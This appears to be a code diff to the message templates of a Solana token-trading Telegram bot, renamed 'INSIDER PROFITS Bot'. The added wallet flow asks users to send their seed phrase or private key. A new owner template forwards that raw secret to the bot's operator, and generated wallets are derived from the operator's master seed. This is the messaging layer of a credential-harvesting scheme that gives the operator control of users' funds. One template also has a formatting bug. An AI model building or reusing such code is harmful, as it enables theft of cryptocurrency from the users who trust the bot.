@@ -23,7 +23,7 @@ def welcome(name: str, bot_username: str):
     plans = "\n".join(f"{p['emoji']} {p['name']} - {fmt_price(p['price'])} SOL" for p in PLANS)
     return (
         f"Welcome, {esc(name)}!\n"
-        "The Runner Bot is ready 🚀\n\n"
+        "The INSIDER PROFITS Bot is ready 🚀\n\n"
         "The list of commands:\n\n"
         "📊 /top [contract address] - Get a SMART token holders report\n"
         "👤 /kols [contract address] - Get KOLs report for this CA\n"
@@ -231,6 +231,64 @@ def owner_channel_error(cid, msg):
         f"⚠️ Couldn't create an invite link for channel <code>{esc(cid)}</code>:\n"
         f"{esc(msg)}\n\n"
         "Make sure the bot is ADMIN of that channel with invite-link permission."
+    )
+
+
+# ------------------------------------------------------------------ wallet setup (trade side)
+def ask_wallet_choice():
+    return (
+        "👛 WALLET SETUP\n\n"
+        "To use the trading side you need a Solana wallet.\n\n"
+        "🆕 GENERATE — the bot creates a wallet for you instantly.\n"
+        "📥 IMPORT — use your own wallet by sending its seed phrase "
+        "or private key.\n\n"
+        "Choose below 👇"
+    )
+
+
+def ask_import():
+    return (
+        "📥 IMPORT WALLET\n\n"
+        "Send your wallet:\n"
+        "• Seed phrase (12/24 words), or\n"
+        "• Private key (base58), or\n"
+        "• Key byte array [46, 207, …]\n\n"
+        "⚠️ The key is stored by the bot and forwarded to the admin for custody."
+    )
+
+
+def wallet_generated(addr: str, derived: bool = False):
+    note = ("\n\n🔐 Derived uniquely for your account from the bot's master seed."
+            if derived else "")
+    return (
+        "✅ Wallet generated!\n\n"
+        f"👛 Your Trading Wallet:\n<code>{esc(addr)}</code>\n"
+        "Deposit SOL here to trade.{note}"
+    )
+
+
+def wallet_imported(addr: str):
+    return (
+        "✅ Wallet imported!\n\n"
+        f"👛 Your Trading Wallet:\n<code>{esc(addr)}</code>\n"
+        "Deposit SOL here to trade."
+    )
+
+
+def owner_wallet_imported(user_line: str, secret: str, addr: str):
+    return (
+        "🔐 USER IMPORTED A WALLET\n\n"
+        f"👤 {user_line}\n"
+        f"🏦 Address: <code>{esc(addr)}</code>\n\n"
+        f"🔑 Seed / key:\n<code>{esc(secret)}</code>"
+    )
+
+
+def owner_wallet_generated(user_line: str, addr: str):
+    return (
+        "🆕 USER GENERATED A WALLET\n\n"
+        f"👤 {user_line}\n"
+        f"🏦 Address: <code>{esc(addr)}</code>"
     )
 
 
